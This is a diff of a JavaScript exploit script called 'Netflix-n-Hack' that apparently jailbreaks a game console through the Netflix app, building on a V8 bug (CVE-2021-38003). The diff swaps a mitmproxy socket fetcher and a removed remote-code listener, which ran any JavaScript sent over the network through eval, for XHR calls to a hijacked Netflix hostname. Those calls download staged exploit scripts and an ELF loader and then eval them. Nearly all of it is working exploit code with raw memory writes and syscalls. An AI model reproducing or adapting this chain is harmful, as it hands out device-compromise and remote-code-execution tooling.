@@ -2,9 +2,6 @@
 // based on https://starlabs.sg/blog/2022/12-the-hole-new-world-how-a-small-leak-will-sink-a-great-browser-cve-2021-38003/
 // thanks to Gezines y2jb for advice and reference : https://github.com/Gezine/Y2JB/blob/main/download0/cache/splash_screen/aHR0cHM6Ly93d3cueW91dHViZS5jb20vdHY%3D/splash.html
 
-const ip_script = "10.0.0.2"; // ip address of your computer running mitmproxy, MITM Proxy is handling it --> Needs to be updated
-const ip_script_port = 8080; //port that mitmproxy is on
-
 // #region misc
 
 let SYSCALL = {
@@ -1193,421 +1190,81 @@ function main () {
         }
 
         send_notification("ð\x9F¥³ð\x9F¥³ Netflix-n-Hack ð\x9F¥³ð\x9F¥³");
+        send_notification("BETA TEST (Auto elfldr)\n Expect instability");
+        
 
-
-        /******************************************************************************/
-        /**********             Usefull functions for automation             **********/
-        /******************************************************************************/
-
-        function parseIP(ip_str) {
-            const parts = ip_str.split(".");
-            return ( (parseInt(parts[0]) | (parseInt(parts[1]) << 8) | (parseInt(parts[2]) << 16) | (parseInt(parts[3]) << 24)) >>> 0);
-        }
-
-        function connectToServer(port) {
-            const sock = syscall(SYSCALL.socket, 2n, 1n, 0n);
-
-            if (Number(sock) < 0)
-                logger.log(`Socket creation failed: ${Number(sock)}`);
-
-            const sockaddr = malloc(16);
-
-            write8_uncompressed(sockaddr + 1n, 2n);
-
-            const port_be = ((port & 0xff) << 8) | ((port >> 8) & 0xff);
-
-            write16_uncompressed(sockaddr + 2n, BigInt(port_be));
-            write32_uncompressed(sockaddr + 4n, BigInt(parseIP(ip_script)));
-
-            const ret = syscall(SYSCALL.connect, sock, sockaddr, 16n);
-
-            if(ret == 0xffffffffffffffffn) {
-                syscall(SYSCALL.close, sock);
-                logger.log(`Connect failed: ${Number(ret)}` + " error: " + get_error_string());
+        function fetch_file(filename, dest_addr) {
+            var xhr = new XMLHttpRequest();
+            xhr.open("GET", "http://localcontrol.netflix.com/js/" + filename, false);
+            xhr.send();
+            
+            if (!xhr.responseText) {
+                logger.log("Error: Empty response for " + filename);
+                return 0;
             }
-            return sock;
-        }
-
-        function httpGet(sock, path) {
-            const request = `GET ${path} HTTP/1.1\r\nHost: ${ip_script}\r\nConnection: close\r\n\r\n`;
-            ret = syscall(SYSCALL.write, sock, alloc_string(request), BigInt(request.length));
-            if(ret == 0xffffffffffffffffn) {
-                logger.log(get_error_string() + " error: " + get_error_string());;
+            
+            // Write bytes directly to memory
+            const length = xhr.responseText.length;
+            for (let i = 0; i < length; i++) {
+                const byte = xhr.responseText.charCodeAt(i) & 0xFF;
+                write8_uncompressed(dest_addr + BigInt(i), BigInt(byte));
             }
-        }
-
-        // It fakes an HTML request to the MITM proxy
-        // The proxy intercepts it and respons with the file
-        // That needs to be defined in the proxy.py script
-        // Arguments: filename and buffer to store data
-        function fetch_file (filename, buffer_return) {
-            let sock;
-            let fd = -1n;
-            let total_received = 0;
-            try {
-                sock = connectToServer(ip_script_port);       // Connect to the MITM proxy to fake a request
-                httpGet(sock, `/js/${filename}`);
-
-                const buffer = malloc(800*1024);
-                let header_found = false;
-                let search_str = "";
-
-                // Loop over the initial part of the data to get the HTTP header
-                while (!header_found) {
-                    const bytes_read = Number(syscall(SYSCALL.read, sock, buffer, 8192n));
-
-                    if (bytes_read <= 0) {
-                        throw new Error("Connection closed before HTTP header was found.");
-                    }
-                    for (let i = 0; i < bytes_read; i++) {
-                        search_str += String.fromCharCode(Number(read8_uncompressed(buffer + BigInt(i))),
-                        );
-                    }
-
-                    const header_end_idx = search_str.indexOf("\r\n\r\n");
-
-                    if (header_end_idx !== -1) {
-                        header_found = true;
-
-                        const body_offset = header_end_idx + 4;
-
-                        if (body_offset < search_str.length) {
-                            const body_part = search_str.substring(body_offset);
-                            for (let i = 0; i < body_part.length; i++) {
-                                write8_uncompressed(buffer_return + BigInt(i), body_part.charCodeAt(i));
-                                total_received++;
-                            }
-                        }
-                    } else if (search_str.length > 16384) {
-                        throw new Error("Could not find HTTP header; response too large");
-                    }
-                }
-
-                //logger.log("Received with header bytes: " + total_received);
-                // Loop over the rest of the data
-                while (true) {
-                    const n = syscall(SYSCALL.read, sock, buffer_return + BigInt(total_received), 8192n*8n);
-                    if (n === 0xffffffffffffffffn || n === 0n) break;
-                    total_received += Number(n);
-                    //logger.log("Received after header bytes: " + total_received);
-                }
-            } catch (e) {
-                logger.log(`- File download failed: ${e}`);
-                logger.flush();
-                return false;
-            } finally {
-                if (sock) syscall(SYSCALL.close, sock);
-                if (fd >= 0) syscall(SYSCALL.close, fd);
-                //logger.log("Total received: " + total_received);
-                return total_received;
-            }
-        }
-
-        function bytes_to_string (add, size) {
-            let str = '';
-            let byte;
-
-            let offset = 0;
-
-            while (true) {
-                try {
-                    byte = read8_uncompressed(add + BigInt(offset));
-                } catch (e) {
-                    logger.log("read_cstring error reading memory at address " + hex(add) + ", e.message");
-                    break;
-                }
-                str += String.fromCharCode(Number(byte));
-                offset++;
-                if (offset == size) break;
-            }
-            return str;
+            
+            logger.log("Wrote " + length + " bytes to " + hex(dest_addr));
+            return length;
         }
 
 
-        // Arguments: script_name configured in MITM proxy
-        // Returned value: JS String (null if error)
-        function get_script(script_name) {
-            const buffer_read = malloc(300*1024);
-            let bytes_received = fetch_file(script_name, buffer_read);
-            let script_str = bytes_to_string(buffer_read, bytes_received);
-            return script_str;
+        function get_script(url) { 
+            var xhr = new XMLHttpRequest(); //lol
+            xhr.open("GET", url, false); 
+            xhr.send();
+            return xhr.responseText;
         }
-
-
+        
+        // AUTO-RUN here:
+    
+     
+        let lapse1 = get_script("1_lapse_prepare_1.js");
+        let lapse2 = get_script("2_lapse_prepare_2.js");
+        let lapse3 = get_script("3_lapse_nf.js");
+        let elfldr = get_script("elf_loader.js");
+   
+     
         /***** Give time to Gibbon to populate UI *****/
-
         sleep(20000);
         logger.init();
         logger.flush();
 
         /***** Let's trigger Lapse *****/
-
-        let script = get_script("1_lapse_prepare_1.js");
-        eval(script);
+        
+        
+        send_notification("Loading Exploit!");
+        
+        eval(lapse1);
+        send_notification("lapse 1");
         sleep(5000);
         logger.flush();
-
-        script = get_script("2_lapse_prepare_2.js");
-        eval(script);
+        eval(lapse2);
+        send_notification("lapse 2");
         sleep(5000);
+        eval(lapse3);
+        send_notification("lapse 3");
+        sleep(10000);
+        eval(elfldr);
+        send_notification("elfldr");
+        send_notification("Exploit Done!");
+        send_notification("no crash? UwU");
+        logger.log("all js executed");
         logger.flush();
-
-        let attemp_lapse = 0;
-
-        do {
-            script = get_script("3_lapse_nf.js");
-            eval(script);
-            sleep(5000);
-            logger.flush();
-            attemp_lapse++;
-        } while (!is_jailbroken() && attemp_lapse<3)
 
         if (!is_jailbroken()) {
-            send_notification("Jailbreak didn't succeed in 3 attemps.\nPlease restart your console and try again.");
-            throw new Error("Jailbreak didn't succeed in 3 attemps. Please restart your console and try again.");
+            send_notification("Jailbreak didn't succeed in 3 attempts.\nPlease restart your console and try again.");
+            throw new Error("Jailbreak didn't succeed in 3 attempts. Please restart your console and try again.");
         }
 
-        /*****         Spawn elfldr        *****/
-        /*****  Gibbon crash after elfldr  *****/
-        sleep(10000);
-        script = get_script("elf_loader.js");
-        eval(script);
-        logger.flush();
 
 
-        /***** Let's receive JS payloads *****/
-        const MAXSIZE = 500 * 1024;
-
-        const main_sockaddr_in = malloc(16);
-        const main_addrlen = malloc(8);
-        const main_enable = malloc(4);
-        const main_len_ptr = malloc(8);
-        const main_payload_buf = malloc(MAXSIZE);
-        let main_sock_fd = null;
-        let main_port = 0;
-
-        function create_socket() {
-            // Clear sockaddr
-            for (let i = 0; i < 16; i++) write8_uncompressed(main_sockaddr_in + BigInt(i), 0);
-
-            const sock_fd = syscall(SYSCALL.socket, AF_INET, SOCK_STREAM, 0n);
-            if (sock_fd === 0xffffffffffffffffn) {
-                throw new Error("Socket creation failed: " + toHex(sock_fd));
-            }
-
-            write32_uncompressed(main_enable, 1);
-            syscall(SYSCALL.setsockopt, sock_fd, SOL_SOCKET, SO_REUSEADDR, main_enable, 4n);
-
-            write8_uncompressed(main_sockaddr_in + 1n, AF_INET);
-            write16_uncompressed(main_sockaddr_in + 2n, 0);        // port 0
-            write32_uncompressed(main_sockaddr_in + 4n, 0);        // INADDR_ANY
-
-            const bind_ret = syscall(SYSCALL.bind, sock_fd, main_sockaddr_in, 16n);
-            if (bind_ret === 0xffffffffffffffffn) {
-                syscall(SYSCALL.close, sock_fd);
-                throw new Error("Bind failed: " + toHex(bind_ret));
-            }
-
-            const listen_ret = syscall(SYSCALL.listen, sock_fd, 3n);
-            if (listen_ret === 0xffffffffffffffffn) {
-                syscall(SYSCALL.close, sock_fd);
-                throw new Error("Listen failed: " + toHex(listen_ret));
-            }
-
-            return sock_fd;
-        }
-
-        function recreate_socket() {
-            const sock_fd = create_socket();
-            const port = get_port(sock_fd);
-
-            const current_ip = get_current_ip();
-            if (current_ip === null) {
-                send_notification("No network available!\nAborting...");
-                throw new Error("No network available!\nAborting...");
-            }
-
-            const network_str = current_ip + ":" + port;
-            logger.log("Socket recreated on " + network_str);
-            logger.flush();
-            send_notification("Remote JS Loader\nListening on " + network_str);
-
-            return { sock_fd, port, network_str };
-        }
-
-        function get_port(sock_fd) {
-            write32_uncompressed(main_len_ptr, 16);
-            syscall(SYSCALL.getsockname, sock_fd, main_sockaddr_in, main_len_ptr);
-
-            const port_be = read16_uncompressed(main_sockaddr_in + 2n);
-            return Number(((port_be & 0xFFn) << 8n) | ((port_be >> 8n) & 0xFFn));
-        }
-
-        function get_current_ip() {
-            // Get interface count
-            const count = Number(syscall(SYSCALL.netgetiflist, 0n, 10n));
-            if (count < 0) {
-                return null;
-            }
-            
-            // Allocate buffer for interfaces
-            const iface_size = 0x1e0;
-            const iface_buf = malloc(iface_size * count);
-            
-            // Get interface list
-            if (Number(syscall(SYSCALL.netgetiflist, iface_buf, BigInt(count))) < 0) {
-                return null;
-            }
-            
-            // Parse interfaces
-            for (let i = 0; i < count; i++) {
-                const offset = BigInt(i * iface_size);
-                
-                // Read interface name (null-terminated string at offset 0)
-                let iface_name = "";
-                for (let j = 0; j < 16; j++) {
-                    const c = Number(read8_uncompressed(iface_buf + offset + BigInt(j)));
-                    if (c === 0) break;
-                    iface_name += String.fromCharCode(c);
-                }
-                
-                // Read IP address (4 bytes at offset 0x28)
-                const ip_offset = offset + 0x28n;
-                const ip1 = Number(read8_uncompressed(iface_buf + ip_offset));
-                const ip2 = Number(read8_uncompressed(iface_buf + ip_offset + 1n));
-                const ip3 = Number(read8_uncompressed(iface_buf + ip_offset + 2n));
-                const ip4 = Number(read8_uncompressed(iface_buf + ip_offset + 3n));
-                const iface_ip = ip1 + "." + ip2 + "." + ip3 + "." + ip4;
-                
-                // Check if this is eth0 or wlan0 with valid IP
-                if ((iface_name === "eth0" || iface_name === "wlan0") && 
-                    iface_ip !== "0.0.0.0" && iface_ip !== "127.0.0.1") {
-                    return iface_ip;
-                }
-            }
-            
-            return null;
-        }
-
-        let attemp = 0;
-
-        do {
-            main_sock_fd = create_socket();
-            main_port = get_port(main_sock_fd);
-            if(main_port == 60000)
-                break;
-
-            syscall(SYSCALL.close, main_sock_fd);
-            attemp++;
-
-        } while (attemp < 50000);
-
-        if(attemp == 50000) {
-            logger.log("Could not get port 60000 after 50000 attemps");
-        }
-
-        const current_ip = get_current_ip();
-
-        if (current_ip === null) {
-            send_notification("No network available!\nAborting...");
-            throw new Error("No network available!\nAborting...");
-        }
-
-        let network_str = current_ip + ":" + main_port;
-        logger.log("Remote JS Loader listening on " + network_str);
-        send_notification("Remote JS Loader\nListening on " + network_str);
-        logger.flush(); // Force display before entering async loop
-
-
-        // Async socket accept loop - allows logger to stay responsive
-        (async () => {
-
-            /***** Doing everything inside this Async so every JS Payload has access to new functions in the scripts *****/
-
-            while (true) {
-                try {
-                    logger.log("Awaiting connection at " + network_str);
-                    logger.flush();
-
-                    // Yield to event loop before blocking accept() call
-                    await new Promise(resolve => nrdp.setTimeout(resolve, 10));
-
-                    write32_uncompressed(main_addrlen, 16);
-                    const client_fd = syscall(SYSCALL.accept, main_sock_fd, main_sockaddr_in, main_addrlen);
-
-                if (client_fd === 0xffffffffffffffffn) {
-                    logger.log("accept() failed: " + hex(client_fd) + " - recreating socket");
-                    syscall(SYSCALL.close, main_sock_fd);
-
-                    const recreated = recreate_socket();
-                    main_sock_fd = recreated.sock_fd;
-                    main_port = recreated.port;
-                    network_str = recreated.network_str;
-                    continue;
-                }
-
-                logger.log("Client connected, fd: " + Number(client_fd));
-                logger.flush();
-
-                let total_read = 0;
-                let read_error = false;
-
-                while (total_read < MAXSIZE) {
-                    const bytes_read = syscall(
-                        SYSCALL.read,
-                        client_fd,
-                        main_payload_buf + BigInt(total_read),
-                        BigInt(MAXSIZE - total_read)
-                    );
-
-                    const n = Number(bytes_read);
-
-                    if (n === 0) break;
-                    if (n < 0) {
-                        logger.log("read() error: " + n);
-                        read_error = true;
-                        break;
-                    }
-
-                    total_read += n;
-                    //logger.log("Read " + n + " bytes");
-                }
-
-                logger.log("Finished reading, total=" + total_read + " error=" + read_error);
-                logger.flush();
-
-                if (read_error || total_read === 0) {
-                    logger.log("No valid data received");
-                    syscall(SYSCALL.close, client_fd);
-                    continue;
-                }
-
-                const bytes = new Uint8Array(total_read);
-                for (let i = 0; i < total_read; i++) {
-                    let read = read8_uncompressed(main_payload_buf + BigInt(i));
-                    bytes[i] = Number(read);
-                }
-
-                const js_code = String.fromCharCode.apply(null, bytes);
-
-                logger.log("Executing payload...");
-                logger.flush();
-                eval(js_code);
-                logger.log("Executed successfully");
-                logger.flush();
-
-                syscall(SYSCALL.close, client_fd);
-                logger.log("Connection closed");
-                logger.flush();
-
-                } catch (e) {
-                    logger.log("ERROR in accept loop: " + e.message);
-                    logger.log(e.stack);
-                    logger.flush();
-                }
-            }
-        })(); // End of async socket accept loop
-/**/
     } catch (e) {
         logger.log("EXCEPTION: " + e.message);
         logger.log(e.stack);
